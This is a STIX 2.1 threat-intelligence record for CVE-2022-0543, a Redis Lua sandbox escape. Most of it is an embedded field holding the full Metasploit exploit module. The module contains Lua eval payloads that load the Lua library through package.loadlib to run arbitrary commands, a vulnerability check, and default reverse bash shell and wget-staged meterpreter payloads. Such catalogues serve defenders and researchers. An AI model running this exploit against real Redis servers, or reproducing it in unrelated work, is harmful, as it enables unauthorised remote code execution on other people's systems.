{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--16635e2b-fcc2-42d8-94fe-1706ae99d904",
    "created": "2024-08-14T16:58:01.567769Z",
    "modified": "2024-08-14T16:58:01.567773Z",
    "name": "Redis Lua Sandbox Escape",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/redis/redis_debian_sandbox_escape.rb",
            "external_id": "redis_debian_sandbox_escape.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-0543"
        },
        {
            "source_name": "reference",
            "url": "https://www.lua.org/pil/8.2.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce"
        },
        {
            "source_name": "reference",
            "url": "https://www.debian.org/security/2022/dsa-5081"
        },
        {
            "source_name": "reference",
            "url": "https://ubuntu.com/security/CVE-2022-0543"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n  include Msf::Auxiliary::Redis\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Redis Lua Sandbox Escape',\n        'Description' => %q{\n          This module exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The\n          vulnerability was introduced by Debian and Ubuntu Redis packages that\n          insufficiently sanitized the Lua environment. The maintainers failed to\n          disable the package interface, allowing attackers to load arbitrary libraries.\n\n          On a typical `redis` deployment (not docker), this module achieves execution\n          as the `redis` user. Debian/Ubuntu packages run Redis using systemd with the\n          \"MemoryDenyWriteExecute\" permission, which limits some of what an attacker can\n          do. For example, staged meterpreter will fail when attempting to use mprotect.\n          As such, stageless meterpreter is the preferred payload.\n\n          Redis can be configured with authentication or not. This module will work with\n          either configuration (provided you provide the correct authentication details).\n          This vulnerability could theoretically be exploited across a few architectures:\n          i386, arm, ppc, etc. However, the module only supports x86_64, which is likely\n          to be the most popular version.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Reginaldo Silva', # Vulnerability discovery and PoC\n          'jbaines-r7' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2022-0543' ],\n          [ 'URL', 'https://www.lua.org/pil/8.2.html'],\n          [ 'URL', 'https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce' ],\n          [ 'URL', 'https://www.debian.org/security/2022/dsa-5081' ],\n          [ 'URL', 'https://ubuntu.com/security/CVE-2022-0543' ]\n        ],\n        'DisclosureDate' => '2022-02-18',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => {},\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'wget'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'MeterpreterTryToFork' => true,\n          'RPORT' => 6379\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('LUA_LIB', [true, 'LUA library path', '/usr/lib/x86_64-linux-gnu/liblua5.1.so.0']),\n      OptString.new('PASSWORD', [false, 'Redis AUTH password', 'mypassword'])\n    ])\n  end\n\n  # See https://github.com/rapid7/metasploit-framework/pull/13143\n  def has_check?\n    true # Overrides the override in Msf::Auxiliary::Scanner imported by Msf::Auxiliary::Redis\n  end\n\n  # Use popen to execute the desired command and read back the output. This\n  # is how the original PoC did it.\n  def do_popen(cmd)\n    exploit = \"eval '\" \\\n      \"local io_l = package.loadlib(\\\"#{datastore['LUA_LIB']}\\\", \\\"luaopen_io\\\"); \" \\\n      'local io = io_l(); ' \\\n      \"local f = io.popen(\\\"#{cmd}\\\", \\\"r\\\"); \" \\\n      'local res = f:read(\"*a\"); ' \\\n      'f:close(); ' \\\n      \"return res' 0\" \\\n      \"\\n\"\n    sock.put(exploit)\n    sock.get(read_timeout)\n  end\n\n  # Use os.execute to execute the desired command. This doesn't return any output, and likely\n  # isn't meaningfully more useful than do_open but I wanted to demonstrate other execution\n  # possibility not demonstrated by the original poc.\n  def do_os_exec(cmd)\n    exploit = \"eval '\" \\\n      \"local os_l = package.loadlib(\\\"#{datastore['LUA_LIB']}\\\", \\\"luaopen_os\\\"); \" \\\n      'local os = os_l(); ' \\\n      \"local f = os.execute(\\\"#{cmd}\\\"); \" \\\n      \"' 0\" \\\n      \"\\n\"\n\n    sock.put(exploit)\n    sock.get(read_timeout)\n  end\n\n  def check\n    connect\n\n    # Before we get crazy sending exploits over the wire, let's just check if this could\n    # plausiably be a vulnerable version. Using INFO we can check for:\n    #\n    # 1. 4 < Version < 6.1\n    # 2. OS contains Linux\n    # 3. redis_git_sha1:00000000\n    #\n    # We could probably fingerprint the build_id as well, but I'm worried I'll overlook at\n    # package somewhere and it's nice to get final verification via exploitation anyway.\n    info_output = redis_command('INFO')\n    return Exploit::CheckCode::Unknown('Failed authentication.') if info_output.nil?\n    return Exploit::CheckCode::Safe('Unaffected operating system') unless info_output.include? 'os:Linux'\n    return Exploit::CheckCode::Safe('Invalid git sha1') unless info_output.include? 'redis_git_sha1:00000000'\n\n    redis_version = info_output[/redis_version:(?<redis_version>\\S+)/, :redis_version]\n    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?\n    return Exploit::CheckCode::Safe(\"The reported version is unaffected: #{redis_version}\") if Rex::Version.new(redis_version) < Rex::Version.new('5.0.0')\n    return Exploit::CheckCode::Safe(\"The reported version is unaffected: #{redis_version}\") if Rex::Version.new(redis_version) >= Rex::Version.new('6.1.0')\n    return Exploit::CheckCode::Unknown('Unsupported architecture') unless info_output.include? 'x86_64'\n\n    # okay, looks like a worthy candidate. Attempt exploitation.\n    result = do_popen('id')\n    return Exploit::CheckCode::Vulnerable(\"Successfully executed the 'id' command.\") unless result.nil? || result[/uid=.+ gid=.+ groups=.+/].nil?\n\n    Exploit::CheckCode::Safe(\"Could not execute 'id' on the remote target.\")\n  ensure\n    disconnect\n  end\n\n  def execute_command(cmd, _opts = {})\n    connect\n\n    # force the redis mixin to handle auth for us\n    info_output = redis_command('INFO')\n    fail_with(Failure::NoAccess, 'The server did not respond') if info_output.nil?\n\n    # escape any single quotes\n    cmd = cmd.gsub(\"'\", \"\\\\\\\\'\")\n\n    # On success, there is no meaningful response. I think this is okay because we already have\n    # solid proof of execution in check.\n    resp = do_os_exec(cmd)\n    fail_with(Failure::UnexpectedReply, \"The server did not respond as expected: #{resp}\") unless resp.nil? || resp.include?('$-1')\n    print_good('Exploit complete!')\n  ensure\n    disconnect\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-02-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}